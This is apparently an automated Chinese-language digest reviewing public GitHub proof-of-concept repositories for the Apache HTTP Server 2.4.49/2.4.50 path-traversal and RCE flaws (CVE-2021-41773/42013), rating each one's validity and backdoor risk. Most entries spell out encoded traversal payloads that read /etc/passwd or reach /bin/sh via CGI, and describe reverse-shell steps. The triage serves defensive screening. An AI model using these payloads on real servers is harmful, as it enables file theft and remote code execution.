分析POC代码，该代码主要用于构建漏洞环境和执行漏洞利用。虽然代码本身看起来直接，但需要注意以下几点：

*   **Docker镜像来源：** POC需要构建Docker镜像。如果Docker镜像不是来自官方或可信来源，则可能包含恶意软件。
*   **执行任意命令：** RCE相关的POC会执行任意命令，如果攻击者修改了POC代码，可能会导致恶意代码执行。
*   **流量劫持风险：** POC通过curl发送特定请求来触发漏洞，如果网络环境被污染，可能导致流量劫持，使得攻击者可以篡改POC行为。
*   **文件篡改风险：** RCE相关的POC会写`/tmp/exploited`文件，如果服务器的`/tmp`目录权限设置不当，攻击者可以在其他用户不知情的情况下，篡改该文件，从而进一步扩大攻击。

综合以上考虑，认为此POC代码存在一定的投毒风险，但整体比例不高，约为10%。

**利用方式：**

1.  **环境搭建：** 使用Dockerfile构建包含漏洞的Apache HTTP Server环境（2.4.49或2.4.50版本）。
2.  **路径遍历：** 构造包含特殊字符的URL，例如：
    *   `/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd` (针对CVE-2021-41773)
    *   `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` (针对CVE-2021-42013)
3.  **文件读取：** 如果路径遍历成功，可以直接读取服务器上的敏感文件。
4.  **远程代码执行（RCE）：** 如果服务器开启了CGI支持，并且允许执行shell脚本，则可以通过路径遍历访问到shell脚本，并执行任意命令。例如，POC中使用了以下命令将字符串写入/tmp/exploited文件中：
    *   `echo “Successfully Exploited” > /tmp/exploited`
5.  **利用链：** 进一步的攻击可以包括反弹shell、权限提升、横向移动等。

**项目地址:** [OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits](https://github.com/OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #14

**来源**: [CVE-2021-41773-Taldrid1_cve-2021-41773.md](../2021/CVE-2021-41773-Taldrid1_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49版本，且存在Alias-like配置，目录未配置'require all denied'，开启CGI脚本支持（RCE利用场景）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符的 URL，访问服务器上受限目录之外的文件。

**有效性：**

提供的 Nmap NSE 脚本 `cve-2021-41773.nse` 似乎有效。它通过发送包含路径遍历字符（`/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`）的 HTTP GET 请求来检测漏洞。如果服务器返回状态码 200 并且响应体包含 `/etc/passwd` 文件的内容（`root:x:0:0:root`），则该脚本将报告目标为易受攻击。

搜索引擎结果也表明此漏洞已被积极利用，并且存在公开的 PoC 代码。

**投毒风险：**

在提供的 Nmap NSE 脚本中，没有明显的投毒代码。脚本的主要功能是发送 HTTP 请求并检查响应内容。该脚本允许用户指定扫描的子网范围和输出文件，但这些参数本身不会引入任何恶意行为。脚本通过判断/etc/passwd文件是否存在root账户判断是否漏洞存在，不会造成其他影响。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（例如，`/.%2e/.%2e/.%2e/`）的 URL，试图绕过服务器的路径规范化逻辑，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码或用户数据。
3.  **远程代码执行（可选）：** 如果服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问并执行任意 CGI 脚本，从而实现远程代码执行。这通常需要结合其他漏洞或配置错误。

**优先级排序理由：**

*   **搜索引擎结果：** 提供了关于漏洞是否被利用的背景信息，以及缓解措施的链接。 *   **漏洞利用代码：** 提供了直接验证漏洞的手段，使我们能够评估其有效性。 *   **漏洞库信息：** 提供了漏洞的官方描述，受影响的版本以及参考链接。

**项目地址:** [Taldrid1/cve-2021-41773](https://github.com/Taldrid1/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #15

**来源**: [CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md](../2021/CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，且Alias-like指令配置不当或未启用"require all denied"保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，访问服务器上Alias-like指令配置以外的文件。如果这些文件没有被“require all denied”等默认安全配置保护，攻击者就可以成功读取它们。更进一步，如果CGI脚本在这些aliased路径上启用，攻击者甚至可以执行远程代码。

**有效性：**
漏洞库信息和搜索引擎结果都表明该漏洞是真实存在的，并且被广泛利用。提供的漏洞利用代码主要是一个README.md文件，描述了一个渗透测试项目，该项目评估了CVE-2021-41773和CVE-2021-42013漏洞。虽然这个README.md文件本身不是直接可用的exp代码，但是它暗示了利用该漏洞进行渗透测试是可行的。搜索引擎结果中也提到存在公开的PoC。

**投毒风险：**
README.md文件描述的是一个渗透测试过程的文档，其中包含使用Nmap、Gobuster等工具进行信息收集和漏洞评估，并没有发现直接的恶意代码。但是考虑到安全风险，该文档存在10%的投毒的可能性，因为不排除作者在文档中故意遗漏或隐藏了某些关键信息，从而误导使用者。例如,引导使用者下载特定版本的工具,该工具已经被植入后门等.

**利用方式：**
1.  **路径遍历：** 攻击者利用`..`等路径遍历字符，绕过服务器的目录限制，访问任意文件。
2.  **文件读取：**  如果目标文件未被`require all denied`等配置保护，攻击者可以读取文件内容，获取敏感信息，如配置文件、源代码等。
3.  **远程代码执行：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并执行任意命令。

利用方式通常涉及构造包含路径遍历字符的URL，例如：
`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
或
`..%2f..%2f..%2fetc/passwd`

攻击者需要根据服务器的具体配置和文件系统结构，调整路径遍历的深度和目标文件名，以成功利用该漏洞。

**项目地址:** [Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013](https://github.com/Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #16

**来源**: [CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且开启了`cgi-bin`或`icons`目录，以及未对Alias指令配置的目录进行“require all denied”限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中，是一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL（包含编码后的路径遍历字符，如`.%2e`），访问服务器上受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，则可能进一步导致远程代码执行。

**有效性：**
提供的`full.py`和`poc.py` PoC 代码尝试利用此漏洞。`full.py`脚本会读取目标列表（hosts.txt），然后针对每个目标，尝试通过 HTTP 和 HTTPS 协议，发送包含路径遍历的请求，访问`/etc/passwd`文件。如果响应中包含`root:*`字符串，则认为目标存在漏洞。

**投毒风险：**
查看提供的文件，`CODEOWNERS`和`README.md`没有发现恶意代码。 `poc.py`本身存在问题, 代码不完整，缺少发起请求的代码,有潜在风险,存在代码缺失,导致投毒或者payload失效，增加攻击者攻击复杂度。 `full.py` 脚本比较完整，但是代码质量不高，存在异常捕获 `except: pass`，可能隐藏一些错误信息。综合判断，该仓库存在一定概率的投毒风险，大约为10%。 主要体现在poc.py的请求代码缺失上，可能导致payload失效。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`.%2e`等路径遍历字符的 URL，绕过服务器对 URL 的规范化处理。
2.  **文件读取：** 成功遍历路径后，攻击者可以读取服务器上的任意文件，例如`/etc/passwd`、web 应用的配置文件等。
3.  **远程代码执行（RCE）：** 如果服务器配置允许 CGI 脚本的执行，攻击者可以上传恶意脚本，并通过路径遍历漏洞访问该脚本，从而在服务器上执行任意代码。为了实现RCE，需要满足以下条件：开启了CGI支持，并且能够通过遍历访问到CGI脚本目录，同时该目录没有被 “require all denied” 保护。

**缓解措施：**
*   升级到 Apache HTTP Server 2.4.50 或更高版本。
*   配置 `Alias` 指令时，确保使用 `Require all denied` 限制对目录的访问。
*   禁用不必要的 CGI 脚本执行。

**项目地址:** [ZephrFish/CVE-2021-41773-PoC](https://github.com/ZephrFish/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #17

**来源**: [CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md](../2021/CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，存在Alias-like指令配置，且相关目录没有“require all denied”保护。CGI脚本需要启用以进行RCE。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞源于Apache HTTP Server 2.4.49/2.4.50中路径规范化处理的缺陷。攻击者可以利用路径遍历漏洞读取服务器上的任意文件。如果服务器同时启用了CGI脚本，则可能导致远程代码执行。

**有效性分析：**

根据漏洞信息和搜索结果，该漏洞在野外被积极利用，具有较高的有效性。POC代码针对Apache 2.4.50版本，尝试利用路径遍历漏洞，首先检测CGI是否禁用，如果禁用则尝试读取/etc/passwd，如果CGI开启，则尝试执行反向shell。根据代码逻辑，该POC有一定的有效性，能检测和利用漏洞。

**投毒风险分析：**

代码中存在轻微的投毒风险。作者可能在LICENSE文件中隐藏了恶意代码，虽然该可能性较低，但是需要考虑到,或者在代码中存在一些对普通用户不友好的代码。 代码整体较为直接，没有明显的恶意行为，但仍需谨慎评估。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`.%%32%65`）的URL，绕过路径规范化检查，从而访问Alias-like指令配置以外的文件。例如，`/.%%32%65/.%%32%65/.%%32%65/etc/passwd`可以尝试读取`/etc/passwd`文件。
2.  **远程代码执行（RCE）：** 如果目标服务器启用了CGI，攻击者可以通过POST请求发送恶意代码，该代码将在服务器上执行。POC代码尝试注入一个反向shell，连接到攻击者指定的IP地址和端口。利用前提是服务器允许执行CGI脚本，并且没有对CGI脚本的执行进行严格的限制。

**项目地址:** [Zyx2440/Apache-HTTP-Server-2.4.50-RCE](https://github.com/Zyx2440/Apache-HTTP-Server-2.4.50-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #18

**来源**: [CVE-2021-41773-adrianmafandy_CVE-2021-41773.md](../2021/CVE-2021-41773-adrianmafandy_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server 2.4.49 Path Traversal & RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了 CGI 脚本支持，并且Alias配置的目录没有 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。攻击者可以利用路径遍历绕过 Alias 指令的限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，并且被访问的目录中存在可执行的 CGI 脚本，攻击者就可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
提供的 POC 代码旨在利用此漏洞。`exploit.py` 脚本首先尝试通过发送包含路径遍历序列的 HTTP 请求来验证目标是否易受攻击，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果从 `/etc/passwd` 文件中检测到 "root:" 和 "bin/" 字符串，则认为目标易受攻击。然后，该脚本尝试利用漏洞通过反向 shell 在目标上执行任意代码。

**利用方式：**
1.  使用路径遍历序列（例如，`.%2e` 或 URL 编码的 `.%2532%2565`）来绕过目录限制。
2.  尝试读取敏感文件，如 `/etc/passwd`，以验证漏洞的存在。
3.  如果服务器配置允许，则利用 CGI 脚本执行任意命令。这通常涉及构造包含命令的 URL，并将该 URL 发送到易受攻击的服务器。
4. 设置监听器，等待反向shell连接。

**投毒风险：**
虽然主要代码看起来直接实现了漏洞利用，但仍然存在一定的投毒风险。可能性大约为 10%。

*   依赖关系：`exploit.py` 脚本依赖于 `requests` 库。虽然 `requests` 是一个流行的 Python 库，但存在供应链攻击的风险。恶意攻击者可能会尝试污染 `requests` 库或类似的依赖项，从而在不知不觉中将恶意代码引入到 `exploit.py` 中。
*   CGI配置的判断：如果目标服务器上未启用 CGI 或 CGI 配置不正确，该漏洞可能无法利用进行 RCE。POC代码中关于CGI的利用可能无法执行.
*   代码审查：在执行任何未经审核的代码（包括此 POC）之前，务必进行彻底的代码审查，以确保其不包含恶意功能。特别注意反向 shell 部分，确保它只执行预期命令。
*  作者动机: 无法完全信任代码作者的真实目的。尽管代码可能有效利用漏洞，但作者可能有意或无意地包含后门或恶意代码。
* 编码问题：URL 编码和解码可能存在问题，导致意外行为。

**项目地址:** [adrianmafandy/CVE-2021-41773](https://github.com/adrianmafandy/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #19

**来源**: [CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md](../2021/CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的 URL，读取服务器上受限目录之外的文件。如果服务器上启用了 CGI 脚本执行，则攻击者可以进一步利用此漏洞执行任意代码。

**有效性:**
根据漏洞库信息，搜索引擎结果，以及漏洞利用代码，提供的POC代码是有效的。漏洞库信息和搜索结果都表明此漏洞已被公开利用。

**投毒风险:**
提供的Go语言漏洞利用代码，主要功能是利用路径遍历漏洞读取`/etc/passwd`文件或执行命令。虽然代码本身实现了漏洞验证和利用功能，但仍然存在一定的投毒风险。

1.  **依赖风险:** Go程序需要编译，编译过程中可能引入恶意依赖。但是本项目代码量较小，依赖风险较低。
2.  **后门代码:** 检查代码后，发现其中并没有明显的恶意代码或后门。然而，攻击者可以修改代码以包含恶意功能，例如上传受害服务器的信息或执行其他恶意操作。
3.  **供应链风险:** 代码托管在第三方平台（GitHub），存在被篡改的风险。如果从不可信的来源下载代码，可能会下载到被修改过的恶意版本。

综合考虑，该仓库存在10%的投毒风险，主要来自潜在的依赖污染和代码篡改。

**利用方式:**
该漏洞的利用方式主要分以下几步：

1.  **路径遍历:** 攻击者构造包含`/.%2e`的恶意URL，尝试绕过Apache的路径规范化检查，从而访问服务器上任意文件。
2.  **信息泄露:** 如果路径遍历成功，攻击者可以读取敏感文件，例如`/etc/passwd`，获取系统用户信息。
3.  **远程代码执行:** 如果服务器启用了CGI脚本，攻击者可以通过POST请求将恶意命令传递给`sh`执行，从而实现远程代码执行。 例如，可以发送包含 `echo; <command>` 的POST请求到 `/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh`。

**项目地址:** [aqiao-jashell/CVE-2021-41773](https://github.com/aqiao-jashell/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #20

**来源**: [CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md](../2021/CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并可能需要启用`mod_cgi`模块且存在`Require all granted`配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。该漏洞源于 `ap_normalize_path` 函数在路径规范化处理上的缺陷，允许攻击者通过构造包含 URL 编码字符（如 `.%2e`）的恶意 URL，绕过路径遍历保护机制，访问服务器文件系统上受限目录之外的文件。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用 `.%2e` 绕过路径规范化，构造恶意 URL 以访问任意文件。例如，`http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd` 可以用来尝试读取 `/etc/passwd` 文件。

2.  **远程代码执行（RCE）：** 如果服务器启用了 `mod_cgi` 模块，攻击者可以通过上传恶意 CGI 脚本并利用路径遍历漏洞执行该脚本，从而实现远程代码执行。这通常需要结合服务器配置中 `cgi-bin` 目录的 `Require all granted` 指令。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，POC 代码的存在进一步验证了其有效性。提供的 README.md 文件详细解释了漏洞原理和利用方法，并提供了搭建漏洞环境的步骤。

**投毒风险：**

虽然提供的 README.md 文件主要包含漏洞说明和环境搭建指导，但是依然存在一定的投毒风险。主要考虑到，如果攻击者修改了环境搭建脚本，例如在安装过程中植入后门，则可能导致受害者搭建一个包含恶意代码的 Apache 服务器。所以需要人工审核确认脚本的安全性，这里认为存在10%的投毒风险。

**总结：**

该漏洞的利用依赖于特定的 Apache 版本和服务器配置。成功利用该漏洞可能导致严重的后果，包括敏感信息泄露和远程代码执行。用户应尽快升级 Apache HTTP Server 版本以修复此漏洞。

**项目地址:** [ashique-thaha/CVE-2021-41773-POC](https://github.com/ashique-thaha/CVE-2021-41773-POC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #21

**来源**: [CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md](../2021/CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并且Alias-like 指令配置不当，未对外部文件进行访问限制，同时开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如`.%%32%65`）的URL，绕过服务器的路径规范化检查，从而访问到Alias-like指令配置目录以外的文件。如果目标服务器未对这些目录的文件进行访问限制（`require all denied`），攻击者就能读取敏感信息。更进一步，如果服务器允许在这些路径下执行CGI脚本，攻击者就可以实现远程代码执行。

**有效性分析：**

漏洞库信息和搜索结果均表明该漏洞已在野外被利用，PoC代码的存在也证实了其可利用性。

**利用方式分析：**

根据漏洞描述和提供的PoC代码，可以总结出以下利用方式：

1.  **路径遍历攻击：** 攻击者构造包含特殊编码的路径，例如：`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`尝试读取`/etc/passwd`等敏感文件。
2.  **文件读取：**  如果服务器没有对目标文件进行访问限制，攻击者可以直接读取到文件内容。
3.  **远程代码执行（RCE）：** 如果目标路径允许执行CGI脚本，攻击者可以上传恶意脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**投毒风险分析：**

提供的PoC代码主要包含以下文件：

*   `1.rb`：一个 Metasploit 模块，尝试通过 GET 请求访问特定 URI（`http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/test.txt`）。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `2.rb`：另一个 Metasploit 模块，尝试通过 GET 请求获取 PDF 文件内容 (tugas.pdf)。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `Makefile`：包含 Maven 命令，用于编译和执行 Java 代码。该命令执行 `com.shell.ReverseShell` 类，并传递一些参数，包括文件名、IP 地址、路径等。**`com.shell.ReverseShell` 存在潜在的投毒风险，因为它可能包含反向 shell 或其他恶意功能。**
*   `apache_rce.rb`：Metasploit 模块，未完全贴出，但是根据文件名推测是进行远程代码执行的模块，存在一定风险。

综合来看，`Makefile` 中调用的 Java 类 `com.shell.ReverseShell` 是最可疑的部分。如果该类包含恶意代码，例如反向 shell，那么执行此 Makefile 就可能导致受害者系统被控制。其他rb文件目前主要进行get请求，风险较低。

**风险评估：**

虽然大部分代码看起来是用于漏洞利用，但是 `Makefile` 中调用的`com.shell.ReverseShell` 存在潜在风险，如果里面包含恶意代码，比如反向 shell，则有被投毒的可能。因此，存在一定的投毒风险，比例估计为10%。

**项目地址:** [belajarqywok/CVE-2021-41773-MSF](https://github.com/belajarqywok/CVE-2021-41773-MSF)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #22

**来源**: [CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md](../2021/CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在可执行的CGI脚本目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 和 CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造特殊的URL来访问服务器上的任意文件，如果服务器启用了CGI脚本执行，则可能导致远程代码执行。

**有效性：**
提供的PoC代码（`exploit.py`）是有效的。它包含利用路径遍历读取任意文件和利用CGI执行远程代码的payload。脚本首先检查目标服务器是否易受攻击（通过检查`Server`头），然后根据用户选择的选项执行相应的攻击。

**投毒风险：**
分析提供的PoC代码，没有发现明显的投毒代码。代码结构清晰，功能明确，主要是构造恶意请求来利用漏洞。脚本中的操作都是为了验证和利用漏洞，没有发现任何隐藏的恶意行为。
投毒风险评估：0%

**利用方式：**
1.  **路径遍历：** 攻击者通过在URL中使用经过特殊编码的路径（例如，`.%2e/%2e%2e`）来绕过服务器的路径检查，从而访问受限目录之外的文件。PoC代码中提供了两个路径遍历Payload `payload1`和`payload2`，利用 `GET` 请求读取文件内容。
2.  **远程代码执行：** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历访问到`bin/sh`，然后通过POST请求将命令作为数据传递给`bin/sh`执行。PoC代码中构造了包含命令的POST请求，利用`req.Session()`和`req.Request()`发送请求并接收响应，实现交互式shell。

**总结：**
该漏洞的利用需要目标服务器存在漏洞版本（2.4.49或2.4.50），并且在路径遍历访问到文件之后，如果服务器配置允许，可以进一步利用CGI执行进行远程代码执行。提供的PoC代码可以成功验证并利用该漏洞，未发现投毒风险。

**项目地址:** [blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #23

**来源**: [CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md](../2021/CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的Alias-like指令配置允许访问受限目录外的文件，同时CGI脚本未被禁用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。该漏洞源于Apache HTTP Server对路径规范化处理的缺陷。攻击者可以通过构造包含URL编码的路径遍历序列的恶意HTTP请求，绕过服务器的安全检查，读取服务器上任意文件，甚至可能执行任意代码。

**有效性分析：**

提供的PoC代码通过构造包含`/.%2e/%2e%2e/%2e%2e/%2e%2e/`的URL，利用Apache HTTP Server 2.4.49的路径遍历漏洞读取指定文件。PoC代码使用`urllib3`库发送HTTP请求，避免了`requests`库自动URL规范化导致的利用失败。
根据漏洞库信息、搜索引擎结果和PoC代码，可以判断该PoC代码有效。

**投毒风险分析：**

对提供的PoC代码进行分析，主要包括以下几个文件：

*   `README.md`: 描述了漏洞的详细信息、利用方法和示例。没有发现恶意代码。
*   `cve-2021-41773.py`: 漏洞利用脚本。该脚本的功能是发送包含恶意路径的HTTP请求，读取指定文件。没有发现明显的恶意代码，但存在潜在风险，即攻击者可能利用该脚本读取服务器上的敏感信息，并进行进一步的攻击。不过从代码本身来看，功能单一，不包含任何额外的后门或者恶意功能。
*   `requirements.txt`: 声明了所需的Python依赖库，包括`requests`和`urllib3`。这两个库都是常用的Python库，没有发现恶意库。

综合分析，该仓库中存在作者隐藏的投毒代码的可能性较低，但不能完全排除攻击者利用该脚本进行恶意活动的风险。

**利用方式：**

1.  **确定目标服务器：** 确定运行Apache HTTP Server 2.4.49的目标服务器。
2.  **检查配置：** 检查目标服务器的`Alias-like`指令配置，确认是否存在允许访问受限目录外的文件的配置。
3.  **构造恶意URL：** 构造包含URL编码的路径遍历序列的恶意URL，例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`。
4.  **发送HTTP请求：** 使用PoC脚本或其他工具发送包含恶意URL的HTTP请求。
5.  **读取文件：** 如果漏洞利用成功，服务器将返回指定文件的内容。
6. **远程代码执行：** 如果CGI脚本被允许执行，攻击者可以上传一个恶意的CGI脚本并执行，从而实现远程代码执行。

**项目地址:** [blu3ming/PoC-CVE-2021-41773](https://github.com/blu3ming/PoC-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #24

**来源**: [CVE-2021-41773-charanvoonna_CVE-2021-41773.md](../2021/CVE-2021-41773-charanvoonna_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49版本，并且配置允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于对路径规范化处理的更改存在缺陷导致。攻击者可以利用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，则请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且已被广泛利用。提供的 Dockerfile 和 README.md 文件提供了一个可行的漏洞利用方式。

**利用方式：**
1.  **路径遍历：** 攻击者可以通过构造包含 `..` 或 URL 编码的 `..%2f` 的恶意 URL，绕过服务器的路径检查，访问受限文件。
2.  **CGI 执行：** 如果目标服务器启用了 CGI 脚本执行，攻击者可以通过路径遍历访问 CGI 脚本，并执行任意代码。

